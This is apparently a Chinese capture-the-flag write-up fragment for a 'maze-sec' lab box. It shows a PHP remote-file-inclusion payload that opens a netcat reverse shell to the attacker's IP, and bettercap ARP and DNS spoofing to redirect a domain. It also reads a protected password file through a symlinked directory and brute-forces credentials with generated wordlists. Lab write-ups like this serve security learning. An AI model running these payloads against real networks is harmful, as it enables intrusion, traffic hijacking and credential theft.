直接告诉是 `RFI` 了，需要 `DNS欺骗` 一下

```bash
cd /tmp/hyh
cat > index.html <<'EOF'
<?php
echo "<pre>";
system("busybox nc 192.168.0.142 4444 -e sh");
echo "</pre>";
?>
EOF
sudo python3 -m http.server 80

sudo arping -I eth0 192.168.0.35 -c 5

cat > /tmp/hyh.cap <<'EOF'
set arp.spoof.targets 192.168.0.35
set dns.spoof.domains hyh.maze-sec.com
set dns.spoof.address 192.168.0.142
arp.spoof on
dns.spoof on
EOF

sudo bettercap -iface eth0 -caplet /tmp/hyh.cap
```

`pspy` 监听了一下，发现没有别的去连这个8080

先尝试了库劫持，但是失败了，可能是利用软链接读找到了一个 `hyh` 组能读的 `/srv/ftp/pub/pass.txt`

```bash
find / -user hyh -type f 2>/dev/null
find / -group hyh -type f 2>/dev/null
```

想弄个软链接读，但是不知道为什么 `http.server` 不能跟随文件的软连接，目录的软链接倒是可以

```bash
cd /var/tmp
rm -f p pubdir
ln -s /srv/ftp/pub pubdir
ls -l /var/tmp/pubdir

python3 - <<'PY'
import urllib.request,time
for _ in range(40):
    try:
        print("==== INDEX ====")
        print(urllib.request.urlopen("http://127.0.0.1:8080/", timeout=2).read().decode())
        print("==== PASS ====")
        print(urllib.request.urlopen("http://127.0.0.1:8080/pubdir/pass.txt", timeout=2).read().decode())
        break
    except Exception as e:
        print("ERR:", e)
        time.sleep(2)
PY
```

去搜了一下有没有群友是这个开头的，好像没有。拿前面群里的脚本先跑个全小写吧

```bash
python3 - <<'PY' > dict.txt
import itertools,string
chars = string.ascii_lowercase
for t in itertools.product(chars, repeat=4):
    print("ma" + "".join(t))
PY

sh subrute.sh
```

爆了很久还是没找到，猜前面是 `maze` 

```bash
python3 - <<'PY' > dict.txt
import itertools,string
chars = string.ascii_lowercase + string.digits
for a,b in itertools.product(chars, repeat=2):
    print("maze" + a + b)
PY

sh subrute.sh
```
